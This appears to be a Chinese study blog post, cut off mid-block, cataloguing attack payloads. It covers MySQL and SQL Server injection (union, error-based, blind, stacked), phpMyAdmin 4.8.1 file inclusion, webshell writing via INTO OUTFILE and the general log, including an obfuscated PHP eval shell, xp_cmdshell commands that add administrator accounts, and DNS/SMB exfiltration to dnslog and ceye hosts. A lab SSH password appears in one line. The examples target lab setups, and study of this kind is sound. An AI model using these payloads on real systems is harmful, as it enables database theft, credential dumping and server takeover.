<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),0x7e),0)</span><br><span class="line">1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),32),0x7e),0)</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="users"),0x7e),0)</span><br><span class="line">1 and updatexml(1,concat(0x7e,substr((select group_concat(column_name)from information_schema.columns where table_name="users"),32),0x7e),0)</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆内容</span><br><span class="line">1 and updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),0)</span><br><span class="line">1 and updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),0)</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119356.png" alt="image-20220206213548868"></p>
<h4 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a><strong>http header 注入</strong></h4><p>登录后, burp抓包,报错注入</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119228.png" alt="image-20220206215455326"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line">1' or updatexml(1,concat(0x7e,database()),0) or'</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119835.png" alt="image-20220206215632287"></p>
<p>cookie处也可以注入</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119178.png" alt="image-20220206220210457"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">1' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),0x7e),0) or'</span><br><span class="line">1 or updatexml(1,concat(0x7e,substr((select group_concat(table_name)from information_schema.tables where table_schema="pikachu"),32),0x7e),0) or'</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119236.png" alt="image-20220206220350183"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">1' or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name="users"),0x7e),0) or'</span><br><span class="line">1' or updatexml(1,concat(0x7e,substr((select group_concat(column_name)from information_schema.columns where table_name="users"),32),0x7e),0) or'</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119219.png" alt="image-20220206220526610"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">爆内容</span><br><span class="line">1' or updatexml(1,concat(0x7e,(select group_concat(username,": ",password) from users),0x7e),0) or'</span><br><span class="line">1' or updatexml(1,concat(0x7e,substr((select group_concat(username,": ",password) from users),32),0x7e),0) or'</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202119846.png" alt="image-20220206220629288"></p>
<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><strong>文件包含</strong></h4><h5 id="复现phpmyadmin4-8-1文件包含漏洞"><a href="#复现phpmyadmin4-8-1文件包含漏洞" class="headerlink" title="复现phpmyadmin4.8.1文件包含漏洞"></a><strong>复现phpmyadmin4.8.1文件包含漏洞</strong></h5><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142081.png" alt="image-20220120215219906"></p>
<p>根据这几行代码可以知道, 将$_REQUEST[‘target’]所表示的文件包含进来,target参数需要满足5个条件</p>
<pre><code> 1. 不能为空
 2. 需要是字串
 3. 不能以index开头
 4. 不能在$target_blacklist数组里面
 5. 满足Core类里面的checkPageValidity()函数检查
</code></pre>
<p>phpmyadmin/libraries/classes/Core/php的443-476行</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142769.png" alt="image-20220120220021134"></p>
<p>根据这个代码知道要使checkPageValidity()函数返回true,需要满足3个条件判断</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202142548.png" alt="image-20220120220439241"></p>
<ol>
<li><p>$page变量的值在 $whilte_list数组中会返回true</p>
</li>
<li><p>经过mb_substr()和mb_strpos()处理的$page-&gt;$_page的变量值在$whitelist数组中</p>
</li>
<li><p>经过urldecode(),mb_substr(),mb_strpos()处理的$page–&gt;$_page的变量值在$_whitelist数组中，这里值的分析的是$page是经过两次url解码再进行同(2)相同的函数处理，第一次由服务器自动解码了一次，然后再由urldecode()函数解码一次，所以在构造payload的时候‘?’应该url编码两次–&gt;‘%253f’.<br> 结合这两处代码，可以开始漏洞复现了。</p>
</li>
</ol>
<h6 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a><strong>任意文件包含</strong></h6><p>构造payload来包含该文件 <code>http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141163.png" alt="image-20220120222107523"></p>
<p>利用phpMyAdmin 4.8.1后台文件包含漏洞，获取登录phpmyadmin系统所产生的sess_sessionID文件，通常linux系统中存放路径为<code>/tmp/sess_[当前会话session值]</code></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141602.png" alt="image-20220120222149478"></p>
<p>写入<code>select '&lt;?php phpinfo ?&gt;' into outfile '/var/www/html/index.php' </code></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141743.png" alt="image-20220120230642515"></p>
<p><code>?index.php?target=db_sql.php%253f/…/…/…/…/…/…/tmp/sess_2km6pa2qec2ci6fhmfb916mivb</code></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202141212.png" alt="image-20220120230841240"></p>
<h5 id="phpmyadmin-getshell实验"><a href="#phpmyadmin-getshell实验" class="headerlink" title="phpmyadmin getshell实验"></a><strong>phpmyadmin getshell实验</strong></h5><p>查看全局日志是否开启,执行如下命令：show variables like “%general%”;</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148099.png" alt="image-20220120232114606"></p>
<p>全局日志是关闭状态</p>
<p>执行 <code>set global general_log = on</code> 打开全局日志</p>
<img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148671.png" alt="image-20220120232738314">

<p>ssh登录 密码:ICQsafe666 查看目录权限</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148525.png" alt="image-20220121002402608"></p>
<p>执行 <code>set global general_log_file = "/var/www/html/uploads/index.php"</code> 设置日志存放路径,放在网站的根目录下</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148732.png" alt="image-20220120232935354"></p>
<h6 id="写入shell一句话马"><a href="#写入shell一句话马" class="headerlink" title="写入shell一句话马"></a><strong>写入shell一句话马</strong></h6><p>执行 <code>select "&amp;lt;?php @eval（$_POST[cmd]）;?&gt;"</code> </p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148562.png" alt="image-20220120234031183"></p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202148255.png" alt="image-20220121002158042"></p>
<p>蚁剑连接</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202149045.png" alt="image-20220220214919531"></p>
<p><strong>全局日志必须开启</strong></p>
<p><strong>必须有目录写权限</strong></p>
<p><strong>必须知道网站的绝对路径</strong></p>
<h5 id="第二种方法：通过-into-outfile-写入shell"><a href="#第二种方法：通过-into-outfile-写入shell" class="headerlink" title="第二种方法：通过 into outfile 写入shell"></a><strong>第二种方法：通过 into outfile 写入shell</strong></h5><p><strong>必须知道网站的绝对路径</strong></p>
<p>select “<!--?php $eZGQ=create_function(chr(077660/01614).base64_decode('cw==').base64_decode('bw==').chr(0276600/01600).chr(79083/783),chr(0xebee/0x256).base64_decode('dg==').str_rot13('n').str_rot13('y').chr(0x5758/0x22f).str_rot13('$').chr(01063-0700).chr(107892/972).chr(01457-01302).str_rot13('r').base64_decode('KQ==').chr(0x8f5a/0x26e));$eZGQ(base64_decode('OTExM'.'Tg4O0'.'BldkF'.'sKCRf'.''.chr(47685/561).chr(0151306/01416).str_rot13('9').chr(051530/0376).chr(0456-0330).''.''.base64_decode('Rg==').chr(0275627/01515).chr(0x35b-0x2e3).base64_decode('TQ==').str_rot13('w').''.'NdKTs'.'yNzMz'.'NTY0O'.'w=='.''));?-->“ into outfile “/var/www/html/uploads/1234.php”</p>
<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202202202150034.png" alt="image-20220220215019683"></p>
<h3 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a><strong>数据外带</strong></h3><p>​        sql注入和命令执行或xxe或ssrf, 凡是看不到回显的地方需要利用数据外带,</p>
<p>DNSlog和smb服务和HTTPlog或CEYE外带数据.</p>
<p>​        DNSlog和 SMB : mysql, mssql</p>
<p>​        HTTPLog: oracle, mssql</p>
<p>​        1. 需要有一个域名, 可以在<a target="_blank" rel="noopener" href="http://dnslog.cn/">这里</a>获取一个临时的 或在 <a target="_blank" rel="noopener" href="http://ceye.io/">ceye</a> 申请一个</p>
<p>​        2. docker 拉取dnslog 的镜像, 然后安装, 也可以</p>
<p>​        3. httplog服务器外带数据</p>
<p>​                python3 -m http.server 9000     # 开启一个http服务</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># SMB 服务器外带数据</span><br><span class="line">​	1. 需要在服务器上开启smb服务</span><br><span class="line">​	2. 连接指定ip地址的服务器 schtasks /create /s \\192.168.xxx.xxx /v /u admin /p 1234 /tn</span><br><span class="line">​	3. select load_file('\\\\smb.xx.dmslog.cn服务器\\\xxx')</span><br><span class="line">​	4. select load_file(concat('\\\\\\','  hex(version())  ', '.mysql.xxx.dnslog.xx\\xxx')) 数据外带</span><br><span class="line">​	5. 只能在windows上利用</span><br></pre></td></tr></tbody></table></figure>

<p>有时候注入发现并没有回显，也不能利用时间盲注，那么就可以利用带外通道，也就是利用其他协议或者渠道，如http请求、DNS解析、SMB服务等将数据带出。</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat('\\\\',(select database()),'.xx.xx\\x));</span><br></pre></td></tr></tbody></table></figure>

<p>其中的load_file的地址为一个远程文件，mysql在load_file()一个远程文件时会发送dns请求包去解析，所以可以带出数据，’\data.xx.xx\x’ ，xx.xx为自己的服务器名，没有的话可以去这里 <a target="_blank" rel="noopener" href="http://ceye.io/">ceye.io</a> 申请一个</p>
<p><strong>mysql外带数据注入条件</strong></p>
<p>\1. mysql.ini 中 secure_file_priv 必须为空</p>
<p>( ps. 修改mysql.ini 文件，在[mysqld] 下加入 secure_file_priv =  )</p>
<blockquote>
<p>mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
<ul>
<li>当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li>
<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 数据外带语法</span><br><span class="line">?id=1 and 1=(select load_file(concat('\\\\', (payload), '.mysql.dns域名\\xxx')))</span><br><span class="line"># 例如 外带数据库名出来</span><br><span class="line">?id = 1 and 1=(select load_file(concat('\\\\', (select hex(table_name) from information_schema.tables where table_schema=database() limit 0,1), '.mysql.ol84xv.dnslog.cn\\xxx')))</span><br></pre></td></tr></tbody></table></figure>



<h2 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL_Server"></a>SQL_Server</h2><h3 id="SQL-Server联合查询"><a href="#SQL-Server联合查询" class="headerlink" title="SQL_Server联合查询"></a><strong>SQL_Server联合查询</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入类型</span><br><span class="line">?id=0'"\)]}--	# 判断是否是字符型和闭合情况</span><br><span class="line">?id=0 and 1=1	# 盘点是否是数字型</span><br><span class="line"># 判断字段数</span><br><span class="line">?id=0' order by 3	# 回显正常为正确字段数</span><br><span class="line"># 判断回显位置</span><br><span class="line">?id=0' union select 1,2,3 -- </span><br><span class="line"># 查看当前库名和版本信息</span><br><span class="line">?id=0' union select 1,db_name(),@@version() --</span><br><span class="line"># 查看所有库</span><br><span class="line">?id=0' union select top 1 1,2,name from master..sysdatabases where name not in (select top 0 name from master..sysdatabases) --</span><br><span class="line"># 查看指定库中表的数量</span><br><span class="line">?id=0' union select 1,2,count(name) from 库名..sysobjects where xtype='U' --</span><br><span class="line"># 查看表</span><br><span class="line">?id=0' union select top 1 1,2,name from 库名..sysobjects where xtype='U' and name not in (select top 0 name from 库名..sysobjects where xtype=char(85)) --</span><br><span class="line"># 查看字段</span><br><span class="line">?id=0' union select top 1 1,2,name from 表名..syscolumns where xtype=char(85) and name not in (select top 0 name from 表名..syscolumns where xtype='U') --</span><br><span class="line"># 查看指定表中字段的数量</span><br><span class="line">?id=0' union select 1,2,count(*) from 库名.dbo.syscolumns where id = object_id ('表名') --</span><br><span class="line"># 查看表中字段</span><br><span class="line">?id=0' union select top 1 1,2,name from 库名..syscolumns where id = object_id('表名') and name not in (select top 0 1,2,name from 库名..syscolumns where id = object_id('表名')) --</span><br><span class="line"># 查看表中内容</span><br><span class="line">?id=0' union select top 1 1,字段1,字段2 from 表名 where 字段1 not in (select top 0 username from users) and 字段2 not in (select top 0 password from 表名) --</span><br></pre></td></tr></tbody></table></figure>

<h3 id="SQL-Server报错注入"><a href="#SQL-Server报错注入" class="headerlink" title="SQL_Server报错注入"></a><strong>SQL_Server报错注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 测试注入点时,故意构造错误的MySQL语句,如果页面回显的错误信息为数据库报出来的错误,即可使用报错注入</span><br><span class="line"># 查看版本</span><br><span class="line">?id=0' and 1=(convert(int,@@version)) --</span><br><span class="line"># 查看所有库</span><br><span class="line">?id=0' and 1=(select top 1 name from master..sysdatabases where name not in (select top 1 name from master..sysdatabases)) --</span><br><span class="line"># 查看表</span><br><span class="line">?id=0' and 1=(select top 1 name from 库名..sysobjects where xtype='U' and name not in (select top 0 name from 库名..sysobjects where xtype='U')) --</span><br><span class="line"># 查看字段</span><br><span class="line">?id=0' and 1=(select top 1 name from 库名.dbo.syscolumns where id =object_id ('表名') and name not in (select top 0 name from 库名.dbo.syscolumns where id =object_id ('表名'))) --</span><br><span class="line"># 查看表内容</span><br><span class="line">?id=0' and 1=cast((select substring((select username,': ', password,'~' from 表名 for xml path('')),1,500))as int)--</span><br><span class="line"></span><br><span class="line"># 其他语法 爆当前库</span><br><span class="line">?id=1' and 1=convert(int,db_name()) --</span><br><span class="line">?id=1' and 1=cast(db_name() as int) --</span><br><span class="line"># 爆当前库表</span><br><span class="line">?id=1' and 1=cast((select quotename(name) from sysobjects where xtype=char(85) for xml path(''))as int) --</span><br><span class="line"># 爆当前表字段</span><br><span class="line">?id=1' and 1=cast((select quotename(name) from syscolumns where id=(select id from sysobjects where name='users' and xtype='U') for xml path(''))as int) --</span><br></pre></td></tr></tbody></table></figure>

<h3 id="SQL-Server布尔盲注"><a href="#SQL-Server布尔盲注" class="headerlink" title="SQL_Server布尔盲注"></a><strong>SQL_Server布尔盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">?id=0' and 1=0 --</span><br><span class="line">?id=0' and 1=1 --</span><br><span class="line"># 判断库数量</span><br><span class="line">?id=0' and 1=(select count(*) from master.dbo.sysdatabases where dbid=7) --</span><br><span class="line"># 判断库长度</span><br><span class="line">?id=0' and 1=(select count(*) from master.dbo.sysdatabases where dbid=1 and len(name)=6)--</span><br><span class="line"># 爆库</span><br><span class="line">?id=0' and (select top 1 ascii(substring(name,1,1)) from sys.sysdatabases where name not in (select top 0 name from sys.sysdatabases))=109--</span><br><span class="line"># 判断指定库中表的数量</span><br><span class="line">?id=0' and (select count(*) from 库名.dbo.sysobjects where name in (select top 1 name from 库名.dbo.sysobjects) and len (name)=9) --</span><br><span class="line"># 爆表 ps:substring(name,1-n,1) 表名第一个字母</span><br><span class="line">?id=0' and (select top 1 ascii(substring(name,1-n,1)) from 库名..sysobjects where name not in (select top 0 name from 库名..sysobjects))=115--</span><br></pre></td></tr></tbody></table></figure>

<h3 id="SQL-Server时间盲注"><a href="#SQL-Server时间盲注" class="headerlink" title="SQL_Server时间盲注"></a><strong>SQL_Server时间盲注</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 判断注入</span><br><span class="line">?id=0' waitfor delay '0:0:3' --</span><br><span class="line"># 判断库数量</span><br><span class="line">?id=0' if ((select count(*) from master.dbo.sysdatabases where dbid=7)=1) waitfor delay '0:0:3'--</span><br><span class="line"># 判断库的长度</span><br><span class="line">?id=0' if ((select count(*) from master.dbo.sysdatabases where dbid=1 and len(name)=6)=1) waitfor delay '0:0:3'--</span><br><span class="line"># 爆库</span><br><span class="line">?id=0' if (select top 1 ascii(substring(name,1,1)) from sys.sysdatabases where name not in (select top 0 name from sys.sysdatabases))=109 waitfor delay '0:0:3'--</span><br><span class="line"># 判断表数量</span><br><span class="line">?id=0' if ((select count(*) from 库名.dbo.sysobjects where name in (select top 1 name from 库名.dbo.sysobjects) and len (name)=9)=1) waitfor delay '0:0:3' --</span><br><span class="line"># 爆表 ps:substring(name,1-n,1) 表名第一个字母</span><br><span class="line">?id=0' if (select top 1 ascii(substring(name,1-n,1)) from model..sysobjects where name not in (select top 0 name from model..sysobjects))=115 waitfor delay '0:0:3'--</span><br></pre></td></tr></tbody></table></figure>

<h3 id="SQL-Server多语句注入"><a href="#SQL-Server多语句注入" class="headerlink" title="SQL_Server多语句注入"></a><strong>SQL_Server多语句注入</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 只有sqlserver 可以直接注入并修改数据</span><br><span class="line"># 报错堆叠注入查看库</span><br><span class="line">?id=0'; and 1=(select top 1 name from master..sysdatabases where name not in (select top 1 name from master..sysdatabases)) --</span><br><span class="line"># 报错堆叠注入查看表</span><br><span class="line">?id=0'; and 1=(select top 1 table_name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)) --</span><br><span class="line"># 报错堆叠注入查看表字段</span><br><span class="line">?id=0'; and 1=(select top 1 column_name from information_schema.columns where table_name = 'users' and table_name not in (select top 1 column_name from information_schema.columns)) --</span><br><span class="line"># 新建库</span><br><span class="line">?id=0'; create dababase test --</span><br><span class="line"># 插入数据</span><br><span class="line">?id=0'; insert into users(id,username,password) values(1,'zs',123) --</span><br><span class="line"># 更改所有用户密码</span><br><span class="line">?id=0'; update users set password='123' --</span><br></pre></td></tr></tbody></table></figure>

<h3 id="xp-cmdshell的命令执行"><a href="#xp-cmdshell的命令执行" class="headerlink" title="xp_cmdshell的命令执行"></a><strong>xp_cmdshell的命令执行</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 利用xp_cmdshell 可以在系统里面执行命令</span><br><span class="line"># 默认是关闭状态,需要sha 帐号才可以开启</span><br><span class="line"># 4 条命令</span><br><span class="line"># 设置options选项</span><br><span class="line">?id=0'; exec sp_configure 'show advanced options', 1; --</span><br><span class="line"># 刷新</span><br><span class="line">?id=0'; reconfigure; --</span><br><span class="line"># 开启xp_cmdshell</span><br><span class="line">?id=0'; exec sp_configure 'xp_cmdshell', 1; --</span><br><span class="line"># 刷新</span><br><span class="line">?id=0'; reconfigure; --</span><br><span class="line"># 测试是否开启成功</span><br><span class="line"># 终端输入 curl dns.log地址, dns.log地址有回显则开启成功</span><br><span class="line">?id=1'; exec master..xp_cmdshell "linux使用curl/wget" --</span><br><span class="line"># 执行命令增加账户</span><br><span class="line">?id=1'; exec master..xp_cmdshell 'net user zs p@ssw0rd/add'; --</span><br><span class="line"># 执行命令将用户添加到管理员组</span><br><span class="line">?id=1'; exec master..xp_cmdshell "net localgroup administrators admin/add" --</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">--------------------------------------------------------</span><br><span class="line"># 创建一个sqldata表,再把命令执行结果写入到表中</span><br><span class="line">?id=1'; create table sqldata(result VARCHAR(8000));--</span><br><span class="line"># 直接写入,xp_cmdshell后面可以是ipconfig或是echo 1 等等</span><br><span class="line">?id=1';INSERT INTO sqldata (result) EXEC..xp_cmdshell "net user" --</span><br><span class="line"># 或者写入 SET @adqa 将命令编码并赋值给@adqa变量,写入sqldata表</span><br><span class="line">?id=1'; DECLARE @adqa VARCHAR(8000);SET</span><br><span class="line">@adqa=0x6970636F6E666967202F616C6C;INSERT INTO sqldata(result) EXEC master..xp_cmdshell @adqa--</span><br><span class="line"># 报错注入获取命令执行结果.需要使用 isnull,清除空数据</span><br><span class="line">?id=1' and 1&lt;(select top 1 result from sqldata where result not in (select top 2 isnull(result,'') from sqldata)) --</span><br></pre></td></tr></tbody></table></figure>

<h3 id="SQL-server-数据外带"><a href="#SQL-server-数据外带" class="headerlink" title="SQL_server 数据外带"></a><strong>SQL_server 数据外带</strong></h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"># cmdshell 被删或绕过时, 使用下面这个函数</span><br><span class="line">xp_dirtree('dnslog')</span><br><span class="line">sp_oacreata('')</span><br><span class="line"># 1. 先定义一个变量 declare @a varchar(1024)</span><br><span class="line"># 2. 将要执行的命令赋值给变量 set @a=db_name()</span><br><span class="line"># 3. 2进制到16进制的函数, master.dbo.fn_varbintohexstr()</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line"># 例如: </span><br><span class="line">?id=1; declare @a varchar(1024);</span><br><span class="line">set @a = '\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),substring(@@version,1,15)))+'dns域名';</span><br><span class="line">exec xp_dirtree @a;</span><br><span class="line">?id=1; declare @a varchar(1024);</span><br><span class="line">set @a='\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),(select top 1 name from master.dbo.sysdatabases where name not in (select top 0 name from master.dbo.sysdatabases))))+'dns域名';</span><br><span class="line">exec xp_dirtree @a;</span><br><span class="line">?id=1; declare @a varchar(1024);</span><br><span class="line">set @a='\\'+master.dbo.fn_varbintohexstr(convert(varbinary(max),(select top 1 name from 库名..sysobjects where xtype=char(85) and name not in (select top 1 name from 库名..sysobjects where xtype=char(85)))))+'dns域名'</span><br><span class="line">exec xp_dirtree @a;</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line"># 数据外带实例</span><br><span class="line"># 爆库</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select top 1 name from master..sysdatabases where name not in</span><br><span class="line">(select top 1 name from master..sysdatabases));</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 爆当前连接的数据库名</span><br><span class="line">http://127.0.0.1/info.aspx?id=1;</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select db_name());</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># master库的表数量是2033,其中用户自建表数量为20</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select count(name) from master..sysobjects where xtype='U');</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line">#</span><br><span class="line">22-57</span><br><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=(select count(name) from "22"..sysobjects where xtype='U');</span><br><span class="line">exec('master..xp_subdirs "//'%2B@a%2B'.z.xxx.ceye.io\\a" ');</span><br><span class="line"># 爆 master 库表</span><br><span class="line">declare @a 